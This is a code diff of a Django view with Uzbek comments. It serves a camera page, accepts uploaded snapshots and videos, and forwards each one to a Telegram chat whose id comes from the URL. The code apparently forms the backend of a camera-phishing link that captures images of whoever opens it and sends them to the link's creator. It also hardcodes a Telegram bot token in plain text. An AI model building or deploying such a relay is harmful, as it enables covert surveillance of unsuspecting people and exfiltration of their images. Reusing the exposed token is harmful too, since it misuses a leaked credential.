@@ -9,10 +9,8 @@ from django.core.files.base import ContentFile
 from django.core.files.storage import default_storage
 from django.shortcuts import render
 
-# Telegram bot token (ilovangizda environment orqali saqlash tavsiya etiladi)
 TELEGRAM_BOT_TOKEN = "8444297437:AAHDEuv1a0BvLHeDAzUJHGAxQGRsCsuIoI0"
 
-# Media papkalar
 IMAGE_DIR = os.path.join(settings.MEDIA_ROOT, 'saved_images')
 VIDEO_DIR = os.path.join(settings.MEDIA_ROOT, 'saved_videos')
 os.makedirs(IMAGE_DIR, exist_ok=True)
@@ -21,13 +19,7 @@ os.makedirs(VIDEO_DIR, exist_ok=True)
 
 @csrf_exempt
 def camera_view(request, id):
-    """
-    Bitta view:
-      - GET  -> camera/index.html sahifasini render qiladi
-      - POST -> 'image' yoki 'video' faylini qabul qilib saqlaydi va Telegramga yuboradi.
-    'id' parametri URL orqali olinadi va Telegram chat_id sifatida ishlatiladi.
-    """
-    # GET -> sahifani ko'rsatish
+
     if request.method == "GET":
         return render(request, "camera/index.html", {
             'MEDIA_URL': settings.MEDIA_URL
@@ -48,7 +40,7 @@ def camera_view(request, id):
             url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
             with open(file_path, "rb") as f:
                 files = {"photo": f}
-                data = {"chat_id": id, "caption": f"Snapshot from {id}"}
+                data = {"chat_id": id, "caption": f"Rasm 📸"}
                 r = requests.post(url, files=files, data=data, timeout=15)
                 # agar kerak bo'lsa r.status_code va r.json() bilan tekshirib yozing
         except Exception as e:
@@ -56,14 +48,12 @@ def camera_view(request, id):
 
         return JsonResponse({"status": "success", "type": "image", "filename": filename})
 
-    # Agar video yuborilgan bo'lsa
     if 'video' in request.FILES:
         uploaded_file = request.FILES['video']
         webm_filename = f"{id}_{uuid.uuid4()}.webm"
         webm_path = os.path.join(VIDEO_DIR, webm_filename)
         default_storage.save(webm_path, ContentFile(uploaded_file.read()))
 
-        # MP4 ga aylantirish
         mp4_filename = f"{id}_{uuid.uuid4()}.mp4"
         mp4_path = os.path.join(VIDEO_DIR, mp4_filename)
 
@@ -80,7 +70,7 @@ def camera_view(request, id):
                 url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"
                 with open(mp4_path, "rb") as f:
                     files = {"video": f}
-                    data = {"chat_id": id, "caption": f"Video from {id}"}
+                    data = {"chat_id": id, "caption": f"Video 🎥"}
                     r = requests.post(url, files=files, data=data, timeout=60)
             except Exception as e:
                 print("Telegram video yuborishda xato:", e)
@@ -91,5 +81,4 @@ def camera_view(request, id):
 
         return JsonResponse({"status": "success", "type": "video", "filename": mp4_filename})
 
-    # Hech qanday fayl bo'lmasa
     return JsonResponse({"status": "error", "message": "Hech qanday fayl yuborilmadi"})
